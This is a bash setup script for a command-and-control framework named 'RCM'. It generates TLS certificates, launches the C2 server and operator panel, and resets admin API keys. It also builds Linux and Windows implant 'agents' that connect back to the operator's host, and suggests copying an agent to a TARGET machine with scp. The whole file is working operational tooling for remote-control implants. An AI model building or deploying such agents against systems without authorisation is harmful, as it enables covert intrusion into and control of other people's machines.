#!/usr/bin/env bash
# setup.sh — RCM one-shot setup: generate TLS certs, start server, build agent
# Usage:
#   ./setup.sh [IP] [build|tls] [--reset]
#   --reset  wipes c2_audit.db so a fresh admin account is created
set -euo pipefail

RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'; BOLD=$'\033[1m'; NC=$'\033[0m'
info() { printf "${CYAN}[*]${NC} %s\n" "$*"; }
ok()   { printf "${GREEN}[+]${NC} %s\n" "$*"; }
warn() { printf "${YELLOW}[!]${NC} %s\n" "$*"; }
err()  { printf "${RED}[-]${NC} %s\n" "$*" >&2; }
die()  { err "$*"; exit 1; }
sep()  { printf "${BOLD}════════════════════════════════════════════════${NC}\n"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ── Parse arguments ───────────────────────────────────────────────────────────
C2_IP=""
BUILD_MODE="none"
RESET=false

for _arg in "$@"; do
    case "$_arg" in
        --reset) RESET=true ;;
        build|tls) BUILD_MODE="$_arg" ;;
        *) [[ -z "$C2_IP" ]] && C2_IP="$_arg" ;;
    esac
done

# ── 1. Determine C2 IP ────────────────────────────────────────────────────────
if [[ -z "$C2_IP" ]]; then
    info "Auto-detecting C2 IP..."
    C2_IP=$(ip -4 route get 1.1.1.1 2>/dev/null \
        | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' \
        | head -1 || true)
    [[ -z "$C2_IP" ]] && C2_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || true)
    [[ -z "$C2_IP" ]] && die "Could not auto-detect IP. Run: $0 <IP>"
    warn "Auto-detected IP: ${BOLD}${C2_IP}${NC}"
    read -rp "Use this IP? [Y/n]: " _confirm
    [[ "${_confirm,,}" == "n" ]] && read -rp "Enter C2 IP: " C2_IP
fi
ok "C2 IP: ${BOLD}${C2_IP}${NC}"
echo ""

# ── 2. Prerequisites ──────────────────────────────────────────────────────────
info "Checking prerequisites..."
for _bin in openssl cargo; do
    command -v "$_bin" &>/dev/null || die "$_bin not found — please install it."
done
ok "Prerequisites satisfied"

# ── 3. Optional DB reset ──────────────────────────────────────────────────────
DB_FILE="${SCRIPT_DIR}/c2_audit.db"
if [[ "$RESET" == "true" ]] && [[ -f "$DB_FILE" ]]; then
    warn "Deleting existing database for fresh credential generation..."
    rm -f "$DB_FILE"
    ok "Database removed"
fi

# Determine first-run BEFORE generating certs (DB state matters now)
FIRST_RUN=true
if [[ -f "$DB_FILE" ]] && [[ -s "$DB_FILE" ]]; then
    if command -v sqlite3 &>/dev/null; then
        _count=$(sqlite3 "$DB_FILE" "SELECT COUNT(*) FROM operators;" 2>/dev/null || echo "0")
        [[ "$_count" -gt 0 ]] && FIRST_RUN=false
    else
        FIRST_RUN=false   # can't read DB, assume returning run
    fi
fi

# ── 4. Generate TLS certificates ─────────────────────────────────────────────
info "Generating TLS certificates for ${BOLD}${C2_IP}${NC}..."
mkdir -p certs && cd certs
rm -f ca.key ca.crt ca.srl \
      server.key server.csr server.crt server.key.der server_ext.cnf \
      client.key client.csr client.crt client.key.der

openssl genrsa -out ca.key 4096 2>/dev/null
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt \
    -subj "/CN=RCM-CA" 2>/dev/null
ok "CA generated"

openssl genrsa -out server.key 2048 2>/dev/null
openssl req -new -key server.key -out server.csr -subj "/CN=${C2_IP}" 2>/dev/null
cat > server_ext.cnf <<EOF
[v3_req]
subjectAltName = @alt_names
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
[alt_names]
IP.1 = ${C2_IP}
IP.2 = 127.0.0.1
DNS.1 = localhost
EOF
openssl x509 -req -days 3650 \
    -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out server.crt -extfile server_ext.cnf -extensions v3_req 2>/dev/null
ok "Server cert generated (SAN: ${C2_IP})"

openssl genrsa -out client.key 2048 2>/dev/null
openssl req -new -key client.key -out client.csr -subj "/CN=rcm-agent" 2>/dev/null
openssl x509 -req -days 3650 \
    -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out client.crt 2>/dev/null
ok "Client cert generated"

openssl pkcs8 -topk8 -nocrypt -in server.key -outform DER -out server.key.der 2>/dev/null
openssl pkcs8 -topk8 -nocrypt -in client.key -outform DER -out client.key.der 2>/dev/null
ok "DER private keys written"

openssl verify -CAfile ca.crt server.crt &>/dev/null \
    || die "Certificate chain verification failed"
ok "Certificate chain verified ✓"

cd "$SCRIPT_DIR"
for _f in certs/ca.crt certs/server.crt certs/server.key.der \
           certs/client.crt certs/client.key.der; do
    [[ -s "$_f" ]] || die "Missing or empty: $_f"
done
ok "All cert files present and non-empty"
echo ""

# ── 5. Kill stale processes ───────────────────────────────────────────────────
for _port in 4443 8080; do
    _pid=$(lsof -ti tcp:"$_port" 2>/dev/null || true)
    if [[ -n "$_pid" ]]; then
        warn "Killing existing process on port ${_port} (PID ${_pid})"
        kill -9 "$_pid" 2>/dev/null || true
        sleep 0.5
    fi
done

# ── 6. Build server ───────────────────────────────────────────────────────────
info "Building RCM server (release)..."
if [[ ! -f target/release/server ]] || \
   [[ certs/server.key.der -nt target/release/server ]]; then
    cargo build --release --bin server 2>&1 \
        | grep -E "^(error|Compiling|Finished)" | tail -4 || true
    ok "Server compiled"
else
    ok "Server binary is up-to-date"
fi
echo ""

# ── 7. Regenerate API key for returning runs ──────────────────────────────────
# For returning runs the plaintext password is gone (hashed in DB).
# However we CAN generate a fresh API key by running a quick SQL update
# and then tell the user that new key.  We do this before the server starts
# so no live session is disrupted.
NEW_API_KEY=""
if [[ "$FIRST_RUN" == "false" ]] && command -v sqlite3 &>/dev/null; then
    NEW_API_KEY=$(cat /proc/sys/kernel/random/uuid 2>/dev/null \
                  || python3 -c "import uuid; print(uuid.uuid4())" 2>/dev/null \
                  || openssl rand -hex 16)
    # Hash the key the same way the Rust code does:
    #   HMAC-SHA256(key="rcm-api-key-v1", msg=raw_key) → hex
    NEW_API_KEY_HASH=$(echo -n "$NEW_API_KEY" \
        | openssl dgst -sha256 -hmac "rcm-api-key-v1" \
        | awk '{print $2}')
    # Update the admin operator's API key
    sqlite3 "$DB_FILE" \
        "UPDATE operators SET api_key='${NEW_API_KEY_HASH}' WHERE role='admin';" \
        2>/dev/null && ok "Admin API key refreshed" || warn "Could not update API key in DB"
fi

# ── 8. Start server ───────────────────────────────────────────────────────────
LOG="${SCRIPT_DIR}/server_run.log"
: > "$LOG"

info "Starting RCM server..."
"${SCRIPT_DIR}/target/release/server" > "$LOG" 2>&1 &
SERVER_PID=$!
echo "$SERVER_PID" > server.pid

info "Waiting for server to be ready..."
for _i in $(seq 1 60); do
    sleep 0.5
    if ! kill -0 "$SERVER_PID" 2>/dev/null; then
        echo ""; err "Server crashed. Last output:"; tail -30 "$LOG"; exit 1
    fi
    grep -q "API Endpoint" "$LOG" 2>/dev/null && break
done

if ! grep -q "API Endpoint" "$LOG" 2>/dev/null; then
    err "Server not ready within 30 s."; tail -20 "$LOG"; exit 1
fi

echo ""
ok "Server is ready (PID ${SERVER_PID})"
echo ""

# ── 9. Show credentials ───────────────────────────────────────────────────────
sep
if [[ "$FIRST_RUN" == "true" ]]; then
    printf "${BOLD}  FIRST-RUN CREDENTIALS  ${YELLOW}— save these, shown once${NC}\n\n"
    # Server prints: [*]   Username:  admin
    #                [*]   Password:  <plaintext>
    #                [*]   API Key:   <uuid>
    grep -E "Username:|Password:|API Key:" "$LOG" \
        | sed 's/\[.\][[:space:]]*//' \
        | sed 's/^[[:space:]]*/  /' \
        || { warn "Could not parse log — dumping raw block:"; grep -A6 "First run" "$LOG" | sed 's/^/  /'; }
else
    printf "${BOLD}  CREDENTIALS${NC}\n\n"
    printf "  ${YELLOW}Password:${NC}  not recoverable (hashed in DB)\n"
    if [[ -n "$NEW_API_KEY" ]]; then
        printf "  ${GREEN}API Key:${NC}   %s  ${YELLOW}(freshly generated)${NC}\n" "$NEW_API_KEY"
        printf "\n  Use this API key in the panel login box instead of the password.\n"
    else
        printf "\n  ${YELLOW}To get a usable API key, run:  ./setup.sh %s --reset${NC}\n" "$C2_IP"
        printf "  This deletes the database and creates a fresh admin account.\n"
    fi

    if command -v sqlite3 &>/dev/null; then
        printf "\n  Operators in DB:\n"
        sqlite3 "$DB_FILE" \
            "SELECT '    ' || username || ' (' || role || ')' FROM operators;" \
            2>/dev/null || true
    fi
fi

printf "\n"
grep "API Endpoint" "$LOG" | sed 's/\[.\][[:space:]]*//' | sed 's/^[[:space:]]*/  /' || true
printf "\n"
sep
echo ""

# ── 10. Panel ────────────────────────────────────────────────────────────────
# The panel is now served directly by the C2 server at http://127.0.0.1:8080/
# No separate python server needed — same origin, no CORS issues.
sep
printf "${BOLD}  PANEL${NC}\n\n"
printf "  ${GREEN}URL:${NC}  ${CYAN}http://127.0.0.1:8080${NC}\n\n"
if [[ -n "$NEW_API_KEY" ]]; then
    printf "  Login:  username ${BOLD}admin${NC}  +  API key shown above\n"
else
    printf "  Login:  username ${BOLD}admin${NC}  +  password shown above\n"
fi
sep
echo ""

PANEL_URL="http://127.0.0.1:8080"
if command -v xdg-open &>/dev/null && [[ -n "${DISPLAY:-}${WAYLAND_DISPLAY:-}" ]]; then
    sleep 0.5 && xdg-open "$PANEL_URL" 2>/dev/null &
fi

# ── 11. Optionally build agent ────────────────────────────────────────────────
if [[ "$BUILD_MODE" == "none" ]]; then
    info "Agent build commands:"
    printf "\n"
    printf "  ${YELLOW}TCP-plain (LAN, no TLS):${NC}\n"
    printf "  cargo run --bin builder -- \\\\\n"
    printf "    --host %s --port 4443 --transport tcp-plain --platform linux --debug\n\n" "$C2_IP"
    printf "  ${YELLOW}TLS (uses certs just generated):${NC}\n"
    printf "  cargo run --bin builder -- \\\\\n"
    printf "    --host %s --port 4443 --transport tls --platform linux\n\n" "$C2_IP"
    printf "  ${YELLOW}Windows TLS:${NC}\n"
    printf "  cargo run --bin builder -- \\\\\n"
    printf "    --host %s --port 4443 --transport tls --platform windows\n\n" "$C2_IP"
else
    TRANSPORT="tcp-plain"; EXTRA_FLAGS="--debug"
    [[ "$BUILD_MODE" == "tls" ]] && { TRANSPORT="tls"; EXTRA_FLAGS=""; }
    info "Building Linux agent (transport=${TRANSPORT})..."
    echo ""
    # shellcheck disable=SC2086
    cargo run --bin builder -- \
        --host "$C2_IP" --port 4443 \
        --transport "$TRANSPORT" --platform linux \
        $EXTRA_FLAGS 2>&1 | tail -8
    echo ""
    AGENT=$(ls -t dist/exe_linux_* 2>/dev/null | head -1 || true)
    if [[ -n "$AGENT" ]]; then
        ok "Agent built: ${BOLD}${AGENT}${NC}"
        printf "\n  Run locally:    ${CYAN}./%s${NC}\n" "$AGENT"
        printf "  Transfer:       ${CYAN}scp %s user@TARGET:/tmp/agent${NC}\n\n" "$AGENT"
    else
        warn "Could not find built agent in dist/"
    fi
fi

echo ""
sep
info "Server PID: ${SERVER_PID}  |  Stop: kill \$(cat server.pid)"
info "Server log: tail -f ${LOG}"
info "Reset creds: ./setup.sh ${C2_IP} --reset"
sep
